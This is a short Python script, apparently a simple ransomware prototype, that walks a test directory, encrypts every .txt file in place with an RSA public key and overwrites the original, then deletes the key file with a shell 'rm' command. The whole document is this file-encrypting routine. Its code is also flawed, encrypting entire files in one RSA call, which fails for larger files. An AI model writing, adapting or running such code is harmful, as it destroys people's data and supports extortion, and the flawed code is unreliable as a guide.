from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import os

encrypted_ext = ('.txt',)

file_paths = []
for root, dir, files in os.walk('/root/Desktop/test'):
	for file in files:
		file_path, file_ext = os.path.splitext(root+'/'+file)
		if file_ext in encrypted_ext:
			file_paths.append(root+'/'+file)

#print(f"[*] encrypting {file_paths}")

key = RSA.importKey(open('public.pem').read())


cipher = PKCS1_OAEP.new(key)

for file in file_paths:
	print(f'[+] Eecrypting {file}')
	with open(file, 'rb') as ef:
		data = ef.read()
	with open(file, 'wb') as e:
		encrypted = cipher.encrypt(data)
		e.write(encrypted)

os.system("rm public.pem")

print(f"[+] deleting public.pem ")
